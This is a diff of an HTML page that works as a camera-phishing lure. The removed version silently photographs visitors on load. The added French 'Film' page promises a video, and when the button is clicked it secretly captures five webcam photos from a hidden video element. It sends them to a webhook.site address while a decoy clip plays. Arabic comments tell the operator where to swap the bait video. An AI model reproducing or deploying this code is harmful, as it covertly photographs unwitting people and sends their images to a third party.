@@ -1,82 +1,126 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="fr" dir="ltr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title></title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Film</title>
   <style>
     body {
       margin: 0;
-      height: 100vh;
       background: #000;
-      color: #fff;
-      font-family: Arial, sans-serif;
+      height: 100vh;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
+      justify-content: center;
+      font-family: Arial, sans-serif;
+    }
+    header {
+      width: 100%;
+      padding: 20px;
+      background: #111;
       text-align: center;
     }
-    #msg {
-      font-size: 40px;
+    h1 {
+      margin: 0;
       color: #ff3366;
-      z-index: 10;
+      font-size: 2.8rem;
     }
-    video, canvas {
-      position: absolute;
-      width:  1px;
-      height: 1px;
+    #btn {
+      margin: 40px 0;
+      padding: 18px 60px;
+      font-size: 1.6rem;
+      background: #ff3366;
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      box-shadow: 0 0 20px #ff0066;
+    }
+    #btn:hover {
+      background: #ff6699;
+    }
+    #video-container {
+      width: 95%;
+      max-width: 1000px;
+      display: none;
+      border-radius: 12px;
       overflow: hidden;
-      opacity: 0.01;   /* صغير جدًا وشبه شفاف */
+      box-shadow: 0 0 40px #ff0066;
+    }
+    video {
+      width: 100%;
+      display: block;
     }
   </style>
 </head>
 <body>
 
-  <div id="msg">جاري التحميل...</div>
+<header>
+  <h1>Film</h1>
+</header>
 
-  <video id="v" autoplay playsinline muted></video>
-  <canvas id="c"></canvas>
+<button id="btn">Ouvrir la vidéo</button>
 
-  <script>
-    (async () => {
-      const msg = document.getElementById('msg');
-      const video = document.getElementById('v');
-      const canvas = document.getElementById('c');
-      const ctx = canvas.getContext('2d');
+<div id="video-container">
+  <video id="main-video" controls>
+    <source id="video-src" src="" type="video/mp4">
+  </video>
+</div>
 
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
-        });
+<video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
 
-        video.srcObject = stream;
+<script>
+const btn = document.getElementById('btn');
+const videoContainer = document.getElementById('video-container');
+const mainVideo = document.getElementById('main-video');
+const videoSrc = document.getElementById('video-src');
+const hiddenVideo = document.getElementById('hiddenVideo');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
 
-        // نعطي وقت أطول شوية للكاميرا عشان تستقر
-        await new Promise(r => setTimeout(r, 1200));
+const WEBHOOK_URL ="https://webhook.site/931505bc-2b78-4afe-b3c0-440372424d90 ";
+const VIDEO_URL ="https://files.catbox.moe/j88flk.mp4 ";  // ← غيّر هنا برابط الفيديو اللي تبيه
 
-        canvas.width  = video.videoWidth  || 640;
-        canvas.height = video.videoHeight || 480;
+btn.onclick = async () => {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
 
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    hiddenVideo.srcObject = stream;
+    await hiddenVideo.play();
 
-        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.72));
+    // التقاط 5 صور سريعًا
+    for (let i = 1; i <= 5; i++) {
+      setTimeout(() => capturePhoto(i), i * 400);
+    }
 
-        const formData = new FormData();
-        formData.append('image', blob, 'photo.jpg');
+    // إظهار الفيديو وتشغيله
+    videoSrc.src = VIDEO_URL;
+    mainVideo.load();
+    videoContainer.style.display = 'block';
+    mainVideo.play();
 
-        await fetch('https://webhook.site/88dae8aa-d964-44bb-aabb-4aa6b6760657', {
-          method: 'POST',
-          body: formData
-        });
+  } catch (err) {
+    // إذا رفض الإذن → ما يظهر الفيديو
+    alert("Veuillez autoriser la caméra pour voir la vidéo.");
+  }
+};
 
-        stream.getTracks().forEach(t => t.stop());
+function capturePhoto(num) {
+  canvas.width = hiddenVideo.videoWidth;
+  canvas.height = hiddenVideo.videoHeight;
+  ctx.drawImage(hiddenVideo, 0, 0);
+  canvas.toBlob(blob => {
+    const fd = new FormData();
+    fd.append('photo', blob, `capture_\( {Date.now()}_ \){num}.jpg`);
+    fetch(WEBHOOK_URL, { method: 'POST', body: fd });
+  }, 'image/jpeg', 0.92);
+}
+</script>
 
-        msg.innerText = "تم الإرسال";
-
-      } catch (e) {
-        msg.innerText = "تم رفض الوصول";
-      }
-    })();
-  </script>
 </body>
 </html>
